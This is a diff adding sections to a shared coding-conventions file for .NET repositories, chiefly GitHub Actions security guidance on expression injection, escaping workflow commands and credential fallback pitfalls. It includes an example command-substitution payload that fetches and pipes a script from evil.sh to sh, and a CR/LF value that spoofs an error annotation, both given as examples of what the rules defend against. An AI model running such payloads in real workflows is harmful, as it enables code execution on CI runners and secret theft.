@@ -1,5 +1,41 @@
 # vm2 Shared Conventions
 
+<!-- TOC tocDepth:2..3 chapterDepth:2..6 -->
+
+- [vm2 Shared Conventions](#vm2-shared-conventions)
+  - [For AI Coding Assistants](#for-ai-coding-assistants)
+    - [Code Generation and File Editing](#code-generation-and-file-editing)
+    - [PR Review](#pr-review)
+    - [Language and Writing Quality](#language-and-writing-quality)
+  - [Project Structure](#project-structure)
+  - [Dependency Management](#dependency-management)
+  - [Bash](#bash)
+  - [General C# Coding Conventions](#general-c-coding-conventions)
+  - [Async](#async)
+  - [Services (if applicable)](#services-if-applicable)
+  - [Error Handling](#error-handling)
+    - [The `Do` / `TryDo` dual pattern](#the-do--trydo-dual-pattern)
+    - [`Result<T>` and railway-oriented programming (ROP)](#resultt-and-railway-oriented-programming-rop)
+    - [API surface vs. inner workings](#api-surface-vs-inner-workings)
+  - [Testing](#testing)
+  - [Performance Benchmarks](#performance-benchmarks)
+  - [Performance](#performance)
+  - [Security](#security)
+  - [Naming](#naming)
+  - [AOT and Trimming](#aot-and-trimming)
+  - [Git and PR Hygiene](#git-and-pr-hygiene)
+  - [Documentation](#documentation)
+  - [References](#references)
+    - [Markdown](#markdown)
+  - [File Modification](#file-modification)
+  - [CI / GitHub Actions](#ci--github-actions)
+    - [Quoting GitHub Actions Expressions in Shell Steps](#quoting-github-actions-expressions-in-shell-steps)
+    - [Escaping Free-Form Text in Workflow Commands](#escaping-free-form-text-in-workflow-commands)
+    - [GitHub Actions Expressions: `&&`/`||` Is Not If/Then/Else](#github-actions-expressions--is-not-ifthenelse)
+  - [Build Configuration, TFMs, RIDs, and Preprocessor Symbols](#build-configuration-tfms-rids-and-preprocessor-symbols)
+
+<!-- /TOC -->
+
 The *vm2* family of repositories (packages, solutions, etc.) **share a common set of conventions** for the directory
 structure, project structure, coding style, documentation style, Git and PR hygiene, and more. This file documents these
 shared conventions to ensure **consistency across all repositories** and to provide guidance for contributors.
@@ -82,6 +118,13 @@ The project owner is a non-native English speaker.
 - **Build with `dotnet restore --use-lock-file ... && dotnet build --no-restore ...`**
 - When dependencies change: update `Directory.Packages.props`, **AND** then run `dotnet restore --force-evaluate`, commit both files
 - Dependabot watches `Directory.Packages.props`; after merging a Dependabot PR, run `dotnet restore --force-evaluate` (also done by `RefreshLockFiles.yaml` and `AutoMerge.yaml`)
+
+## Bash
+
+Bash is written and maintained almost entirely in `vm2.DevOps` — its shared function-parameter-validation patterns,
+argument-dispatcher ordering rules, the `&&`/`||` precedence pitfall, and the long-form-options convention now live in
+**[`vm2.DevOps/CLAUDE.md`](https://github.com/vmelamed/vm2.DevOps/blob/main/CLAUDE.md)**, alongside the rest of that
+repo's bash library documentation, rather than being duplicated here for every C#-only consumer repo.
 
 ## General C# Coding Conventions
 
@@ -297,6 +340,20 @@ exceptions, and never references `vm2.Functional`; `TryDo` is for consumers who 
 - Test projects — assembly: `<Package>.Tests`; namespace: `vm2.Tests.<Package>[.<Feature>]`. Note the placement of the `Tests` segment and the mirroring of the assembly structure: it helps avoiding symbol conflicts. Always `<OutputType>Exe</OutputType>` - xUnit v3 + MTP v2.
 - Benchmark projects — assembly: `<Package>.Benchmarks`; namespace: `vm2.Benchmarks.<Package>[.<Feature>]`. Note the placement of the `Benchmarks` segment and the mirroring of the assembly structure: it helps avoiding symbol conflicts. Always `<OutputType>Exe</OutputType>` - BenchmarkDotNet requires the default name for the entry point assembly.
 - Do not mix naming strategies within a single repository
+- **Use a URN for the unique identifier of a resource that we own and define** — an XML schema or namespace, a
+  serialization format, an encryption key, an organizational resource, etc. (e.g. `urn:schemas-vm-com:Linq-Expressions-Serialization-Json`).
+  A URN names the resource without implying it can be retrieved over the network, which a URL does. Storage keys are a
+  separate choice: a database key is usually a ULID or GUID, and the URN can serve as the external, human-meaningful identity.
+- **Identifiers of shared, registered dialects keep their official form.** A JSON Schema's `$schema` must be the
+  registered meta-schema URI (e.g. `https://json-schema.org/draft/2020-12/schema`), because validators match that exact
+  string. Replacing it with a repository URN would prevent the dialect from being recognized.
+- **Fetchability is a security decision, not a naming one.** Some schema and XML tooling automatically dereferences a
+  `$schema`, `$ref`, or namespace URI found in a document. That is the same class of hazard as XXE in XML parsers: an
+  attacker-influenced or later-hijacked URL can become an SSRF vector (an internal service, a cloud metadata endpoint,
+  a `file://` path) the moment such a tool processes the file. Resolve identifiers through an explicit,
+  developer-controlled mapping (e.g. VSCode's `json.schemas` setting, matched by file glob), not an implicit network call.
+- **Any other `http(s)://` identifier used for a resource MUST be justified** with a comment or documentation explaining
+  why it is needed and why automatic fetching is safe there.
 
 ## AOT and Trimming
 
@@ -330,6 +387,10 @@ rationale in README/CHANGELOG/PR.
   - `fix: correct null reference in UserService`
   - `feat(serialization): add IUtf8SpanFormattable implementation`
 - One logical concern per PR
+- **Review source files over 500 lines for possible splitting.** Length is a smell, not a verdict: a file with one
+  cohesive responsibility may stay long. Such a file SHOULD say so in its header comment, for example
+  `# length-review: keep together -- <one-sentence reason>`, so a reviewer (human or AI) knows the length is deliberate.
+  The PR description MAY also discuss the decision when it is worth a reviewer's attention.
 - **Credit AI co-authorship.** When an AI coding assistant materially contributed to a commit (wrote or substantially
   shaped the code, tests, or docs), add a `Co-Authored-By:` trailer at the end of the commit message naming the
   assistant, e.g. `Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>`. This keeps authorship honest and the
@@ -351,8 +412,9 @@ rationale in README/CHANGELOG/PR.
   avoid unexplained placeholders. A reader must be able to paste the example and have it compile
 - Standard references block:
 
-      ## References
-      - [Title](URL) — Author or organization
+## References
+
+- [Title](URL) — Author or organization
 
 ### Markdown
 
@@ -391,6 +453,207 @@ When adding a new project, register it in `.github/workflows/CI.yaml`:
 | `PACKAGE_PROJECTS`   | Projects to pack as NuGet packages    |
 
 Also add the project to the `.slnx` solution file under the appropriate folder.
+
+### Quoting GitHub Actions Expressions in Shell Steps
+
+GitHub substitutes a `${{ ... }}` expression as literal text **before** the shell parses the line — the shell never
+sees the expression syntax itself, only whatever string came out of it. This makes the quoting around it a real
+security boundary, not a style choice.
+
+- **`inputs.*` (`workflow_call` and `workflow_dispatch`) MUST always go through the step's (or the job's or the workflow's)
+  `env:`, then reference the resulting shell variable — no exceptions, no per-value judgment call.** This is the only pattern
+  immune to injection regardless of what the value contains, because GitHub Actions writes `env:` values into the runner's
+  environment directly — the shell reads them as inert data and never re-parses them for metacharacters, quotes, or
+  command substitution. Deciding case by case whether a *particular* input is "safe enough" to skip this is exactly
+  how `reason` and `bencher-branch` shipped single-quoted directly in this repo's own reusable workflows: the value
+  looked bounded at the time, or became less bounded later without the `run:` step itself changing. `inputs.*` is
+  the one category where that risk is real enough to make `env:` unconditional.
+
+  ```yaml
+  # Always: every inputs.* (and github.head_ref/ref_name -- see below) goes through env:
+  - name: Compute release version
+    env:
+      MINVER_TAG_PREFIX: ${{ inputs.minver-tag-prefix }}
+      REASON: ${{ inputs.reason }}
+      HEAD_REF: ${{ github.head_ref }}
+    run: |
+        declare -a args=(
+            --minver-tag-prefix "$MINVER_TAG_PREFIX"
+            --reason            "$REASON"
+            --head-ref          "$HEAD_REF"
+        )
+  ```
+
+- **`env.*`, `secrets.*`, and `vars.*` MAY be single-quoted `'${{ ... }}'` directly — they are written by whoever
+  has admin/write access to the repo (Settings → Variables/Secrets, or the workflow file's own `env:` block), never
+  by a `workflow_dispatch` input or PR content, so they sit outside the threat model this rule defends against.**
+  This is the same reasoning that already exempts `github.actor` and `github.event_name` below, generalized to the
+  other admin-controlled surfaces. **Caveat:** an `env.*` entry is only safe under this exception when *its own*
+  value is a literal string or itself `vars.*`/`secrets.*` — not when it merely forwards an `inputs.*` value one
+  level removed (e.g. a workflow-level `env: FOO: ${{ inputs.foo }}`, then `${{ env.FOO }}` used in a script). That
+  case carries `inputs.*`'s own risk and MUST follow the `inputs.*` rule above, not this one.
+- **`needs.*` and `steps.*` (job/step outputs, results, and conclusions) SHOULD go through `env:` by default, but
+  this is a preference, not an absolute.** Unlike `inputs.*`, some of these are provably safe on their own terms —
+  `needs.<job>.result`/`steps.<step>.conclusion` are platform-computed enums with a fixed vocabulary, no different
+  in kind from `github.event_name`. The default is `env:` because *verifying* which case you're in — "is this output
+  merely forwarding an `inputs.*` value, or is it independently safe?" — is exactly the error-prone tracking this
+  document exists to avoid; reach for `env:` first and skip it only when you can point to a specific, obvious reason
+  the value can't escape (and it costs nothing to route it anyway if you're unsure).
+- **Pre-approved, unconditionally safe: `github.actor`** (a platform-enforced identity string — GitHub usernames and
+  `<name>[bot]` app logins cannot contain a `'`, by GitHub's own account/app-registration rules, so there is nothing
+  to escape), **`github.event_name`** (a fixed enum GitHub itself defines), and **a literal boolean/numeric
+  constant**. These MAY be single-quoted directly with no caveat.
+- **Exception to the `env.*`/`github.*` exemption: `github.head_ref` and `github.ref_name` still MUST go through
+  `env:`.** Git ref and branch names are allowed to contain `'` — unlike `github.actor`, there is no platform-level
+  character restriction, and a fork PR's branch name is attacker-influenceable. Don't let "it's a `github.*`
+  context" be mistaken for "it's on the safe list."
+- **Double-quoting `"${{ ... }}"` directly in the script is never correct, for anything, ever — even for a value
+  that would otherwise be safe to single-quote.** Bash evaluates `$()`/backtick command substitution inside double
+  quotes, so a value containing one (`$(curl evil.sh | sh)`) executes it outright — this is strictly worse than
+  single-quoting an unsafe value, which at least requires a literal `'` to break out rather than a `$(`.
+- **Exception: concatenation with a live shell variable or string** (e.g.
+  `preprocessor_symbols="$preprocessor_symbols;$DISPATCH_PREPROCESSOR_SYMBOLS"`, where
+  `DISPATCH_PREPROCESSOR_SYMBOLS` was itself captured via `env:` first). Capture the `${{ }}` value into its own
+  `env:`-sourced variable, then concatenate that variable — never concatenate a raw `${{ }}` expression directly,
+  even at the tail end of an otherwise-quoted string.
+- **A `${{ }}` value already inside another language's quoting context follows that language's syntax, not this
+  rule.** For example, a `jq` filter passed as `--jq 'map(select(.headRefName == "${{ github.ref_name }}")) | ...'`
+  needs double quotes around the expression because `jq` string literals require them — `jq` has no single-quoted
+  string syntax. The outer single quotes around the whole `--jq '...'` argument already make it literal to bash;
+  changing the inner quotes would break `jq`'s own parsing without improving security. Prefer routing the value
+  through `env:` and a `--arg`/`--argjson` binding instead when the filter's structure allows it, since that also
+  removes the value from the script text entirely.
+
+### Escaping Free-Form Text in Workflow Commands
+
+Routing a value through `env:` (previous section) makes it safe from **shell** injection. It does **not** make it
+safe to print into a **workflow command** (`::notice::`, `::warning::`, `::error::`, `::group::`, etc.) — that is a
+separate parsing layer the GitHub Actions runner applies to a step's stdout, independent of and after the shell.
+
+- **A workflow command is recognized by the runner scanning the step's entire stdout stream line by line for any
+  line starting with `::` — not just lines your own `printf`/`echo` deliberately wrote as a command.** If a value
+  contains an embedded CR or LF and its raw text reaches stdout by *any* path, the value itself supplies a second
+  "line" in that stream — and if that line happens to start with `::`, the runner treats it as a real command,
+  regardless of what the `printf` that emitted it looked like. A reason like `"fine\n::error::fake failure"` turns
+  one intended `::notice::` into a spoofed `::error::` annotation the workflow never wrote — and the identical thing
+  happens if that same raw reason instead reaches stdout via a plain `## Markdown heading` destined for the step
+  summary, or via a helper like `to_stdout`/`to_summary` that tees its input to both the log and a file. **The
+  trigger condition is "does this value's raw text reach stdout," full stop — not "does my printf look like a `::`
+  command."** A vm2.DevOps workflow shipped exactly this mistake once already: the `::notice::` line was correctly
+  escaped, but a second `printf | to_stdout` right below it, writing an ostensibly-harmless Markdown heading for the
+  step summary, carried the same reason through unescaped — because "it's not a `::` command" was the wrong
+  question to ask.
+- **Always escape with `gh_escape` (`scripts/bash/lib/gh_core.sh`) before interpolating *any*
+  value into a workflow command — the same "always, no judgment call" default as the quoting rule above, and the
+  same pre-approved-list exception** (`github.actor`, `github.event_name`, a literal boolean/numeric constant — the
+  identical list, for the identical reason: nothing else is guaranteed free of CR/LF/`%`). Never `printf %q`.
+  GitHub's own documented workflow-command escaping is `%` -> `%25`,
+  CR -> `%0D`, LF -> `%0A` (percent first, so the `%` introduced by the CR/LF substitutions is not itself
+  re-escaped) — it neutralizes exactly the characters with parsing significance and leaves ordinary punctuation
+  untouched. `printf %q` is a general bash shell-quoting escape: it happens to also remove raw newlines, but it
+  additionally backslash-escapes every shell metacharacter (spaces, commas, parentheses, quotes), so a normal reason
+  like `"fixed a bug, added tests (see #42)"` renders as `fixed\ a\ bug\,\ added\ tests\ \(see\ #42\)` in the Actions
+  UI — correct, but needlessly unreadable.
+
+  ```yaml
+  # Preferred: gh_escape once, reuse the escaped value for every stdout destination --
+  # the ::notice:: line AND the step-summary Markdown, since both reach stdout
+  - name: Log manual trigger reason
+    env:
+      REASON: ${{ inputs.reason }}
+    run: |
+        source $DEVOPS_LIB_DIR/gh_core.sh
+        escaped_reason=$(gh_escape "$REASON")
+        printf '::notice::Manual release triggered by %s. Reason: %s\n' '${{ github.actor }}' "$escaped_reason"
+        printf '## Manual trigger\n\n**Reason:** %s\n' "$escaped_reason" | to_stdout
+
+  # Avoid: the second printf looks harmless (no '::' in it) and reuses the already-computed
+  # escaped_reason, but this variant discards it and pipes the RAW $REASON through to_stdout --
+  # to_stdout still writes to the runner's stdout stream, so an embedded CR/LF in $REASON still
+  # injects a fake command exactly as if the ::notice:: line itself had been left unescaped
+  - name: Log manual trigger reason
+    env:
+      REASON: ${{ inputs.reason }}
+    run: |
+        source $DEVOPS_LIB_DIR/gh_core.sh
+        escaped_reason=$(gh_escape "$REASON")
+        printf '::notice::Manual release triggered by %s. Reason: %s\n' '${{ github.actor }}' "$escaped_reason"
+        printf '## Manual trigger\n\n**Reason:** %s\n' "$REASON" | to_stdout
+  ```
+
+- **This is a distinct risk from the shell-injection rule above and does not substitute for it.** A value can be
+  perfectly safe from shell injection (properly routed through `env:`) and still carry an unescaped CR/LF into
+  stdout. Apply both rules together wherever a value's raw text reaches stdout by any path — a `printf`/`echo` that
+  emits a `::` command, or one that doesn't but is piped through `to_stdout`/`to_summary`, or any other route to the
+  step's own stdout:
+  `env:` for the shell, `gh_escape` for the runner's command parser.
+
+### GitHub Actions Expressions: `&&`/`||` Is Not If/Then/Else
+
+GitHub Actions expressions have no ternary operator; `cond && A || B` is the idiomatic stand-in, mirroring the same
+`A && B || C` pattern bash writers reach for and ShellCheck's SC2015 warns about. Both are the identical trap in
+different languages: the operators chain on **truthiness at each step**, not on `cond` in isolation. If `cond` is
+true but `A` itself evaluates to something falsy (bash: non-zero exit; GitHub Actions: empty string, `false`, `0`,
+`null`), the pair `cond && A` is itself falsy, so `|| B` fires anyway — silently substituting `B` for what should
+have been "true, but empty."
+
+- **This bit for real**, in this repo's own `NUGET_API_KEY: ${{ ... nuget-server == 'nuget' &&
+  steps.nuget-login.outputs.NUGET_API_KEY || secrets.NUGET_API_KEY }}`. If the `nuget` (trusted-publishing/OIDC)
+  path's login step ever produced an empty output, `true && ''` collapsed to `''`, and the whole expression silently
+  fell through to a long-lived static secret — defeating the point of trusted publishing by turning a failed OIDC
+  login into a silent credential swap instead of a hard failure.
+- **Fix: gate each branch by its own independent, negated condition — never by the truthiness of the other
+  branch's payload.**
+
+  ```yaml
+  # Correct: the secret branch is gated by its own condition (!= 'nuget'), so an
+  # empty OIDC output on the 'nuget' path is never masked by a fallback to the secret
+  NUGET_API_KEY: ${{ needs.get-params.outputs.nuget-server != 'nuget' && secrets.NUGET_API_KEY || steps.nuget-login.outputs.NUGET_API_KEY }}
+
+  # Wrong: an empty steps.nuget-login output on the 'nuget' path falls through to
+  # secrets.NUGET_API_KEY even though nuget-server == 'nuget' was true
+  NUGET_API_KEY: ${{ needs.get-params.outputs.nuget-server == 'nuget' && steps.nuget-login.outputs.NUGET_API_KEY || secrets.NUGET_API_KEY }}
+  ```
+
+- **Any `cond && A || B` expression where `A` can legitimately be empty/false/zero MUST be checked for this before
+  it ships**, not only in NuGet publishing — the same shape recurs anywhere a workflow picks between two outputs
+  based on a condition. When in doubt, invert the condition so the branch that can be falsy is the one reached via
+  `||`, not the one gated by `&&`.
+
+## Build Configuration, TFMs, RIDs, and Preprocessor Symbols
+
+- **`Directory.Build.props` is the single source of truth for `TargetFramework` and the artifacts output layout**
+  (`ArtifactsPath`, `UseArtifactsOutput`). Workflows and scripts MUST NOT duplicate or override these — they read
+  build output locations, they do not decide them. This extends to every CLI flag and environment variable that
+  threads one of these build-controlled values through a script (`--configuration`/`CONFIGURATION`,
+  `--framework`/`FRAMEWORK`, `--runtime`/`RUNTIME`, `--artifacts-path`/`ARTIFACTS_PATH`, and any
+  `dotnet-version`/`target-framework` workflow input): these exist as escape valves for a rare, deliberate exception,
+  not as a general-purpose override mechanism. If a script or workflow ends up setting one of these to something
+  other than its resolved default, that MUST be justified in writing — a comment at the override site, or the PR
+  description — not merely "because the parameter is there." `Configuration`'s own narrow exception (below) is the
+  model to follow: a named, human-triggered escape hatch with a stated reason, not a value CI computes or forwards by
+  default. Conversely, an input or CLI flag that no caller ever sets to anything but the default is not a reserved
+  knob — it is dead weight that has silently drifted from what the workflow actually does; remove it rather than
+  leave it standing.
+- **The Runtime Identifier (RID) is deliberately left unset (`""`) today.** Every package builds portable,
+  framework-dependent, OS/architecture-agnostic output — no `RuntimeIdentifier` is set anywhere, and the
+  `runtime-identifier` workflow input exists but defaults to unspecified. This is why `runner-os` (and the
+  `runners-os` matrix in `_ci.yaml`) currently only selects which OS *runs* the build/test/benchmark step; it has no
+  effect on the artifact itself, since the output is the same regardless of runner. The input exists precisely so
+  this can change later: **when AOT publishing is introduced, RID becomes mandatory and MUST be derived from the
+  runner**, not hardcoded once for all of them (e.g. `ubuntu-latest` → `linux-x64`, `windows-latest` → `win-x64`,
+  `macos-latest` → `osx-arm64`). Treat `runner-os` as the future RID axis already in place, waiting for AOT to need
+  it.
+- **`Configuration` defaults to `Release`.** Workflow logic MUST NOT branch on or override `Configuration`; it is a
+  manual/CLI override knob (`workflow_dispatch`, local `dotnet build -c ...`) for the rare case a human needs a
+  Debug build, not something CI decides automatically. There is currently no scenario that justifies CI choosing
+  anything else.
+- **Keep the number of CI-driven preprocessor symbols to a minimum.** Today there is exactly one: `SHORT_RUN`,
+  auto-defined by `Directory.Build.props` for local benchmark builds and added explicitly in CI only for a `push` to
+  a non-main branch with no open PR yet (a faster, less comprehensive benchmark run; the PR-triggered run does the
+  full one). Every other CI path (`pull_request`, `workflow_dispatch`, `push` to `main`) leaves
+  `preprocessor-symbols` empty. Adding a new symbol is a deliberate ecosystem-wide decision, not a per-repo
+  convenience — propose it here first.
 
 ---
 *Canonical source: `vm2.Templates/templates/AddNewPackage/content/.github/CONVENTIONS.md`*
